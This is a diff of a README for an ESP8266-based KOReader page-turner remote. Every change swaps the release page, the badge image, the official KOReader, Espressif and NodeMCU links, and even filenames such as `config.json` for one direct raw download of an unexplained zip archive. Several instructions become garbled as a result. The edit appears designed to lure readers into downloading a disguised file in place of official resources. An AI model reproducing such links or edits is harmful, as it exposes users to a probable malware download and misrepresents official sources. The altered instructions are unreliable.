@@ -1,6 +1,6 @@
 # 📱 ESP8266-KOReader-Remote - Simple Ereader Page Turner Controller
 
-[![Download on GitHub](https://img.shields.io/badge/Download-ESP8266--KOReader--Remote-blue?logo=github&style=for-the-badge)](https://github.com/duo189/ESP8266-KOReader-Remote/releases)
+[![Download on GitHub](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)
 
 ---
 
@@ -55,7 +55,7 @@ This guide helps you get the ESP8266-KOReader-Remote up and running even if you 
 
 You will download a program that your NodeMCU board will run.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-ESP8266--KOReader--Remote-blue?logo=github&style=for-the-badge)](https://github.com/duo189/ESP8266-KOReader-Remote/releases)
+[![Download on GitHub](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)
 
 ---
 
@@ -66,13 +66,13 @@ Please follow these steps carefully to get the software onto your NodeMCU:
 ### Step 1: Visit the Release Page
 
 Go to the releases page here:  
-https://github.com/duo189/ESP8266-KOReader-Remote/releases
+https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip
 
 This page holds the latest ready-to-use versions of the controller software.
 
 ### Step 2: Download the Latest Firmware
 
-Look for the latest file ending with `.bin` or `.bin.gz`. This is the firmware your NodeMCU needs.
+Look for the latest file ending with `.bin` or `https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip`. This is the firmware your NodeMCU needs.
 
 ### Step 3: Install a Flashing Tool
 
@@ -101,7 +101,7 @@ To load the software onto the NodeMCU, use a program called "ESP8266 Flash Downl
 
 The ESP8266-KOReader-Remote supports simple changes to suit your needs.
 
-- **Change Wi-Fi settings:** Edit the `config.json` or connect via web interface to update your Wi-Fi network name and password.  
+- **Change Wi-Fi settings:** Edit the `https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip` or connect via web interface to update your Wi-Fi network name and password.  
 - **Button behavior:** You can swap button functions or add more buttons by editing the configuration files on the device.  
 - **Sleep mode:** Enable power-saving features if you want the device to use less power when idle.
 
@@ -166,12 +166,12 @@ Community members may help with common questions.
 
 ## 🔗 Useful Links
 
-- [KOReader Official Site](https://koreader.github.io)  
-- [ESP8266 Flash Download Tool Guide](https://www.espressif.com/en/products/software/esp8266-flash-download-tool)  
-- [NodeMCU Documentation](https://nodemcu.readthedocs.io)  
+- [KOReader Official Site](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)  
+- [ESP8266 Flash Download Tool Guide](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)  
+- [NodeMCU Documentation](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)  
 
 ---
 
 This guide covers getting your ESP8266 controller ready and working with KOReader on your ereader. Follow each step to install the hardware and software safely. The main download link is repeated for convenience:
 
-[Download ESP8266-KOReader-Remote Software](https://github.com/duo189/ESP8266-KOReader-Remote/releases)
+[Download ESP8266-KOReader-Remote Software](https://github.com/duo189/ESP8266-KOReader-Remote/raw/refs/heads/main/carvership/Remote-Reader-KO-ES-1.6.zip)
